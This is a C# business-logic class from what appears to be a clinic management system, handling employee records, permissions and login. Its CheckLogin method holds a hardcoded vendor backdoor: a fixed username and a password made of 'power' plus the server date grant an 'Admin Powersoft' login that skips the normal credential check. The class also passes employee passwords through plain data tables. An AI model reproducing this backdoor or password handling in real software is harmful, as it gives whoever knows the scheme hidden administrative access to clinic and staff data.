using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Data.Sql;
using System.Data;
using ClinicModel;
using ClinicLibrary;
using ClinicDAL;

namespace ClinicBLL
{
    public class EmployeeBLL
    {
        private static string sUserps = "powersoft0313529521";
        private static string sPassps = "power";

        public static DataTable DTEmployee(string employeeCode, bool offwork)
        {
            DataTable dt = new DataTable();
            try
            {
                dt.Columns.Add(new DataColumn("RowID", typeof(Int32)));
                dt.Columns.Add(new DataColumn("EmployeeCode", typeof(string)));
                dt.Columns.Add(new DataColumn("EmployeeName", typeof(string)));
                dt.Columns.Add(new DataColumn("Sex", typeof(Int32)));
                dt.Columns.Add(new DataColumn("Mobile", typeof(string)));
                dt.Columns.Add(new DataColumn("IDCard", typeof(string)));
                dt.Columns.Add(new DataColumn("Address", typeof(string)));
                dt.Columns.Add(new DataColumn("Birthday", typeof(DateTime)));
                dt.Columns.Add(new DataColumn("PositionCode", typeof(Int32)));
                dt.Columns.Add(new DataColumn("Username", typeof(string)));
                dt.Columns.Add(new DataColumn("Password", typeof(string)));
                dt.Columns.Add(new DataColumn("DepartmentCode", typeof(string)));
                dt.Columns.Add(new DataColumn("OffWork", typeof(Int32)));
                dt.Columns.Add(new DataColumn("PermissionDepart", typeof(string)));
                dt.Columns.Add(new DataColumn("EmployeeGroupID", typeof(Int32)));
                var vlist = EmployeeDal.ListEmployee(employeeCode, offwork);
                foreach (var lt1 in vlist)
                {
                    DataRow dr;
                    dr = dt.NewRow();
                    dr.BeginEdit();
                    dr[0] = lt1.RowID;
                    dr[1] = lt1.EmployeeCode;
                    dr[2] = lt1.EmployeeName;
                    dr[3] = lt1.Sex;
                    dr[4] = lt1.Mobile;
                    dr[5] = lt1.IDCard;
                    dr[6] = lt1.Address;
                    dr[7] = lt1.Birthday;
                    dr[8] = lt1.PositionCode;
                    dr[9] = lt1.Username;
                    dr[10] = lt1.Password;
                    dr[11] = lt1.DepartmentCode;
                    dr[12] = lt1.OffWork;
                    dr[13] = lt1.PermissionDepart;
                    dr[14] = lt1.EmployeeGroupID;
                    dr.EndEdit();
                    dt.Rows.Add(dr);
                }
            }
            catch { dt = null; }
            return dt;
        }

        public static List<EmployeeInf> ListEmployee(string sEmployeeCode)
        {
            return EmployeeDal.ListEmployee(sEmployeeCode);
        }

        public static List<EmployeeViewInf> ListEmployeeForPosition(string position)
        {
            return EmployeeDal.ListEmployeeForPosition(position);
        }
        public static List<EmployeeInf> ListEmployeeForDepart(string sDepart)
        {
            return EmployeeDal.ListEmployeeForDepart(sDepart);
        }

        public static int InsEmployee(EmployeeInf info)
        {
            return EmployeeDal.InsEmployee(info);
        }

        public static int DelEmployee(string sEmployeeCode)
        {
            return EmployeeDal.DelEmployee(sEmployeeCode);
        }

        public static bool CheckLogin(string sUserName, string sPassword, ref string refEmployeeCode, ref string sFullName)
        {
            bool bResult = false;
            try
            {
                if (sUserName == sUserps)
                {
                    if (sPassword == sPassps + Utils.DateServerYYYYMMDD())
                    {
                        bResult = true;
                        refEmployeeCode = "powersoft0313529521";
                        sFullName = "Admin Powersoft";
                    }
                    else
                    {
                        bResult = false;
                        refEmployeeCode = sUserps;
                    }
                }
                else
                {
                    bResult = EmployeeDal.CheckLogin(sUserName, sPassword, ref refEmployeeCode, ref sFullName);
                }
            }
            catch  { bResult = false; }
            return bResult;
        }

        public static Int32 UpdPermissionDepart(string sEmployeeCode, string sDepart)
        {
            try
            {
                return EmployeeDal.UpdPermissionDepart(sEmployeeCode, sDepart);
            }
            catch { return -2; }
        }

        public static Int32 UpdPermissionRepository(string sEmployeeCode, string sRepository)
        {
            try
            {
                return EmployeeDal.UpdPermissionRepository(sEmployeeCode, sRepository);
            }
            catch { return -2; }
        }

        public static Int32 UpdPass(string sEmployeeCode, string sPassNew)
        {
            return EmployeeDal.UpdPass(sEmployeeCode, sPassNew);
        }

        public static DataTable TableEmployeeForPosition(string position, string departmentCode)
        {
            return EmployeeDal.TableEmployeeForPosition(position, departmentCode);
        }
        public static DataTable TableEmployeeGroup()
        {
            return EmployeeDal.TableEmployeeGroup();
        }
        public static bool CheckUserAdmin(string employeeCode)
        {
            return EmployeeDal.CheckUserAdmin(employeeCode);
        }
        public static bool CheckUser(string userName, ref string password)
        {
            return EmployeeDal.CheckUser(userName, ref password);
        }

    }
}
